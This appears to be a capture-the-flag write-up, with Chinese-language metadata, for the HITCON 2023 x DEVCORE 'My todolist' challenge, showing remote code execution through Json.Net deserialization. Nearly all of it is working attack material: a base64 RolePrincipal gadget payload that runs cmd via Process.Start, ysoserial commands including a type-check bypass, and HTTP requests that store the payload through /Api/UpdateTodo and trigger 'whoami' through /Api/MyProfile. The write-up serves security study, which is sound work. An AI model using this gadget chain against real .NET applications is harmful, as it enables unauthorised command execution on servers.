---
title: 'HITCON 2023 x DEVCORE Wargame: My todolist Write-up'
contest: HITCON 2023 x DEVCORE Wargame
year: 2023
difficulty: hard
vuln_type: web_unknown
tags:
- web
- json-net
- typename-all
- role-principal
- ysoserial
- process-start
- dotnet-deserialize
attack_chain:
- TypeNameHandling=All + MetadataPropertyHandling=ReadAhead
- 第一个$type控制target类型
- 第二个$type指定RolePrincipal gadget
- Process.StartInfo执行 /c calc命令
- ysoserial.exe -g RolePrincipal -f Json.Net
- --bgc ActivitySurrogateDisableTypeCheck -c 1
- POST /Api/UpdateTodo 设置uuid+field=value
- POST /Api/MyProfile 触发命令执行cmd=whoami
key_payload: $type=System.Web.Security.RolePrincipal + Process.StartInfo /c calc
one_liner: HITCON 2023 Wargame My todolist：Json.Net反序列化+RolePrincipal+Process.Start
lesson: Json.Net TypeNameHandling=All配合RolePrincipal gadget可RCE
quality: high
full_path: HITCON_2023_x_DEVCORE_Wargame-_My_todolist_Write-up.full.md
meta_path: HITCON_2023_x_DEVCORE_Wargame-_My_todolist_Write-up.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'HITCON 2023 x DEVCORE Wargame: My todolist Write-up。HITCON 2023 Wargame My todolist：Json.Net反序列化+RolePrincipal+Process.Start。关键路径：TypeNameHandling=All + MetadataPropertyHandling=ReadAhead → 第一个$typ...'
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/136182.html
reasoning_chain:
- 源代码 Clone() 函数 → 触发点：TypeNameHandling=All + MetadataPropertyHandling=ReadAhead
- 假设：$type 控制反序列化类型 → 动作：构造 JSON 注入 $type 字段
- 第一个 $type 控制 target 类型 Dictionary → 第二个 $type 指定 RolePrincipal gadget
- 假设：RolePrincipal 是 .NET 已知 gadget → 动作：构造 Process.StartInfo 执行 /c calc
- ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateDisableTypeCheck -c 1
- 观察：生成反序列化 payload → 下一步：注入到 Clone 调用路径
- POST /Api/UpdateTodo uuid+field=value → 触发点：UUID 字段存储反序列化 payload
- 假设：MyProfile 触发反序列化 → 动作：访问 /Api/MyProfile 触发 cmd=whoami
- 观察：服务器端执行命令 → 完成 RCE
failed_attempts:
- 试图用 ObjectStateFormatter 替代 Json.Net → 失败：路由用 JsonConvert
- 只用 ActivitySurrogateSelectorWithoutTypeCheck → 失败：RolePrincipal 仍需 bypass
- 不通过 UpdateTodo 存储 payload → 失败：需要上传通道
key_observations:
- TypeNameHandling=All 是 Json.Net 反序列化漏洞开关
- RolePrincipal 是 .NET 经典 Process.Start gadget
- ysoserial 一键生成 gadget payload
- ActivitySurrogateDisableTypeCheck 是反序列化保护绕过
- Clone() 路径是触发点，UpdateTodo 是 payload 投递通道
prerequisites:
- .NET Json.Net 反序列化原理
- ysoserial 工具使用
- .NET RolePrincipal gadget 链
- C# DeserializeObject + $type 攻击
---
# HITCON 2023 x DEVCORE Wargame: My todolist Write-up

> 原文: https://www.ctfiot.com/136182.html
> ID: 136182


```
public static T Clone<T>(this T source) {
 JsonSerializerSettings settings = new JsonSerializerSettings() {
 TypeNameHandling = TypeNameHandling.All
 };
 return (T) JsonConvert.DeserializeObject(JsonConvert.SerializeObject(source, settings), settings);
}
Dictionary<string, string> source = new Dictionary<string, string>();
 source.Add("key", "value");
 JsonSerializerSettings settings = new JsonSerializerSettings() {
 TypeNameHandling = TypeNameHandling.All
 };
 string result = JsonConvert.SerializeObject(source, settings);
{
 "$type": "System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib",
 "key": "value"
}
Dictionary<string, string> source = new Dictionary<string, string>();
source.Add("$type", "System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
JsonSerializerSettings settings = new JsonSerializerSettings() {
 TypeNameHandling = TypeNameHandling.All
};
JsonConvert.DeserializeObject(JsonConvert.SerializeObject(source, settings), settings);
{
 "$type": "System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib",
 "$type": "System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
}
Dictionary<string, string> source = new Dictionary<string, string>();
source.Add("you control the key", "you control the value");
JsonSerializerSettings settings = new JsonSerializerSettings() {
 TypeNameHandling = TypeNameHandling.All,
 MetadataPropertyHandling = MetadataPropertyHandling.ReadAhead
};
JsonConvert.DeserializeObject(JsonConvert.SerializeObject(source, settings), settings);
Dictionary<string, string> source = new Dictionary<string, string>();
source.Add("$type", "System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
source.Add("System.Security.ClaimsPrincipal.Identities", "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw==");
JsonSerializerSettings settings = new JsonSerializerSettings() {
 TypeNameHandling = TypeNameHandling.All,
 MetadataPropertyHandling = MetadataPropertyHandling.ReadAhead
};
JsonConvert.DeserializeObject(JsonConvert.SerializeObject(source, settings), settings);
--bgc, --bridgedgadgetchains=VALUE
 Chain of bridged gadgets separated by comma (,).
 Each gadget will be used to complete the next
 bridge gadget. The last one will be used in the
 requested gadget. This will be ignored when
 using the searchformatter argument.
ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateDisableTypeCheck -c 1

ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateSelectorFromFile -c ".\ExploitClass.cs;dlls\System.dll;dlls\System.Web.dll"
POST /Api/UpdateTodo HTTP/1.1
Host: localhost:
8003
Content-Type: application/x-www-form-urlencoded
Content-Length: xx
Cookie: <session>

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&field=$type&value=System.Web.Security.RolePrincipal,+System.Web,+Version%3d4.0.0.0,+Culture%3dneutral,+PublicKeyToken%3db03f5f7f11d50a3a
POST /Api/UpdateTodo HTTP/1.1
Host: localhost:
8003
Content-Type: application/x-www-form-urlencoded
Content-Length: xx
Cookie: <session>

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&field=System.Security.ClaimsPrincipal.Identities&value=
POST /Api/MyProfile HTTP/1.1
Host: localhost:
8003
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Cookie: <session>

cmd=whoami
```
